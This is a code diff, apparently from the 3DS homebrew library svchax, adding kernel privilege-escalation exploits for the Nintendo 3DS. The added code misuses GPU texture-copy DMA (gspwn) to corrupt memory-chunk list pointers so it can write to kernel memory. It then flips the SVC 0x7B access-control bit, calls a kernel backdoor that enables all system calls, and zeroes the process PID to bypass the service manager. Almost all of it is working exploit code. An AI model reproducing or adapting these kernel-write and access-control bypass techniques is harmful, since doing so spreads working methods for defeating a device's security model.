-   dst = (u32*)((u32)alloc_address + alloc_size);
-   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
+   svcWaitSynchronization(mch2.alloc_thread, U64_MAX);
+   svcCloseHandle(mch2.alloc_thread);
+   u32* mapped_page = (u32*)(mch2.alloc_address + mch2.alloc_size - 0x1000);
+
+   volatile u32* thread_ACL = &mapped_page[THREAD_PAGE_ACL_OFFSET >> 2];
+
+   svcCreateEvent(&mch2.main_thread_lock, 0);
+   svcCreateEvent(&mch2.target_threads_lock, 1);
+   svcClearEvent(mch2.target_threads_lock);
+
+   for (i = 0; i < mch2.threads_limit; i++)
    {
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      if (mch2.threads[i].keep)
+         continue;
 
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      mch2.threads[i].args.started_event = mch2.main_thread_lock;
+      mch2.threads[i].args.lock = mch2.target_threads_lock;
+      mch2.threads[i].args.target_kaddr = 0;
 
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      thread_ACL[0] = 0;
+      GSPGPU_FlushDataCache((void*)thread_ACL, 16);
+      GSPGPU_InvalidateDataCache((void*)thread_ACL, 16);
 
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      svcClearEvent(mch2.main_thread_lock);
+      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)target_thread_entry, (u32)&mch2.threads[i].args,
+                      mch2.threads[i].stack_top, 0x18, 0);
+      svcWaitSynchronization(mch2.main_thread_lock, U64_MAX);
+
+      if (thread_ACL[0])
+      {
+         thread_ACL[SVC_ACL_OFFSET(0x7B) >> 2] = SVC_ACL_MASK(0x7B);
+         GSPGPU_FlushDataCache((void*)thread_ACL, 16);
+         GSPGPU_InvalidateDataCache((void*)thread_ACL, 16);
+         mch2.threads[i].args.target_kaddr = get_thread_page() + THREAD_PAGE_ACL_OFFSET + SVC_ACL_OFFSET(0x7B);
+         mch2.threads[i].args.target_val = SVC_ACL_MASK(0x7B);
+         break;
+      }
+
    }
-   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   src = (u32*)((u32)&target.page + 0x1000);
-   dst = (u32*)((u32)alloc_address + alloc_size);
-   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
+   svcSignalEvent(mch2.target_threads_lock);
+
+   for (i = 0; i < mch2.threads_limit; i++)
    {
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      if (!mch2.threads[i].handle)
+         continue;
 
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      if (!mch2.threads[i].keep)
+         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
 
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
-      *(--dst) = *(--src);
+      svcCloseHandle(mch2.threads[i].handle);
    }
-   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);
 
-   lock_thread = false;
-   svcWaitSynchronization(alloc_thread_handle, U64_MAX);
-   svcWaitSynchronization(poll_thread_handle, U64_MAX);
-   svcCloseHandle(poll_thread_handle);
-   svcCloseHandle(alloc_thread_handle);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
-   target.has_7B_access = true;
-cleanup:
-   svcSignalEvent(target.lock);
-   svcWaitSynchronization(target.handle, U64_MAX);
-   svcControlMemory(&tmp, alloc_address, 0, alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
+   svcCloseHandle(mch2.target_threads_lock);
+   svcCloseHandle(mch2.main_thread_lock);
+
+   svcControlMemory(&tmp, mch2.alloc_address, 0, mch2.alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
    write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
-   svcCloseHandle(target.handle);
-   svcCloseHandle(target.lock);
    svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);
+
    for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
       svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
    svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
+
+   aptOpenSession();
+   APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
+   aptCloseSession();
+}
+
+
+static void gspwn(u32 dst, u32 src, u32 size, u8* flush_buffer)
+{
+   extern Handle gspEvents[GSPGPU_EVENT_MAX];
+
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
+   GSPGPU_InvalidateDataCache((void*)dst, size);
+   GSPGPU_FlushDataCache((void*)src, size);
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
+
+   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
+   GX_TextureCopy((void*)src, 0, (void*)dst, 0, size, 8);
+   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
+
+   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
+}
+
+/* pseudo-code:
+ * if(val2)
+ * {
+ *    *(u32*)val1 = val2;
+ *    *(u32*)(val2 + 8) = (val1 - 4);
+ * }
+ * else
+ *    *(u32*)val1 = 0x0;
+ */
+
+// X-X--X-X
+// X-XXXX-X
+
+static void memchunkhax1_write_pair(u32 val1, u32 val2)
+{
+   u32 linear_buffer;
+   u8* flush_buffer;
+   u32 tmp;
+
+   u32* next_ptr3;
+   u32* prev_ptr3;
+
+   u32* next_ptr1;
+   u32* prev_ptr6;
+
+   svcControlMemory(&linear_buffer, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
+
+   flush_buffer = (u8*)(linear_buffer + 0x8000);
+
+   svcControlMemory(&tmp, linear_buffer + 0x1000, 0, 0x1000, MEMOP_FREE, 0);
+   svcControlMemory(&tmp, linear_buffer + 0x3000, 0, 0x2000, MEMOP_FREE, 0);
+   svcControlMemory(&tmp, linear_buffer + 0x6000, 0, 0x1000, MEMOP_FREE, 0);
+
+   next_ptr1 = (u32*)(linear_buffer + 0x0004);
+   gspwn(linear_buffer + 0x0000, linear_buffer + 0x1000, 16, flush_buffer);
+
+   next_ptr3 = (u32*)(linear_buffer + 0x2004);
+   prev_ptr3 = (u32*)(linear_buffer + 0x2008);
+   gspwn(linear_buffer + 0x2000, linear_buffer + 0x3000, 16, flush_buffer);
+
+   prev_ptr6 = (u32*)(linear_buffer + 0x5008);
+   gspwn(linear_buffer + 0x5000, linear_buffer + 0x6000, 16, flush_buffer);
+
+   *next_ptr1 = *next_ptr3;
+   *prev_ptr6 = *prev_ptr3;
+
+   *prev_ptr3 = val1 - 4;
+   *next_ptr3 = val2;
+   gspwn(linear_buffer + 0x3000, linear_buffer + 0x2000, 16, flush_buffer);
+   svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
+
+   gspwn(linear_buffer + 0x1000, linear_buffer + 0x0000, 16, flush_buffer);
+   gspwn(linear_buffer + 0x6000, linear_buffer + 0x5000, 16, flush_buffer);
+
+   svcControlMemory(&tmp, linear_buffer + 0x0000, 0, 0x1000, MEMOP_FREE, 0);
+   svcControlMemory(&tmp, linear_buffer + 0x2000, 0, 0x4000, MEMOP_FREE, 0);
+   svcControlMemory(&tmp, linear_buffer + 0x7000, 0, 0x9000, MEMOP_FREE, 0);
+
+}
+
+static void do_memchunkhax1(void)
+{
+   u32 saved_vram_value = *(u32*)0x1F000008;
+
+   // 0x1F000000 contains the enable bit for svc 0x7B
+   memchunkhax1_write_pair(get_thread_page() + THREAD_PAGE_ACL_OFFSET + SVC_ACL_OFFSET(0x7B), 0x1F000000);
+
+   write_kaddr(0x1F000008, saved_vram_value);
+}
+
+Result svchax_init(bool patch_srv)
+{
+   u8 isNew3DS;
+   aptOpenSession();
+   APT_CheckNew3DS(&isNew3DS);
+   aptCloseSession();
+
+   u32 kver = osGetKernelVersion();
+
+   if (!__ctr_svchax)
+   {
+      if (__service_ptr)
+      {
+         if (kver > SYSTEM_VERSION(2, 50, 11))
+            return -1;
+         else if (kver > SYSTEM_VERSION(2, 46, 0))
+            do_memchunkhax2();
+         else
+            do_memchunkhax1();
+      }
+
+      svc_7b((backdoor_fn)k_enable_all_svcs, isNew3DS);
+
+      __ctr_svchax = 1;
+   }
+
+   if (patch_srv && !__ctr_svchax_srv)
+   {
+      u32 PID_kaddr = read_kaddr(CURRENT_KPROCESS) + (isNew3DS ? 0xBC : (kver > SYSTEM_VERSION(2, 40, 0)) ? 0xB4 : 0xAC);
+      u32 old_PID = read_kaddr(PID_kaddr);
+      write_kaddr(PID_kaddr, 0);
+      srvExit();
+      srvInit();
+      write_kaddr(PID_kaddr, old_PID);
+
+      __ctr_svchax_srv = 1;
+   }
+
    return 0;
 }
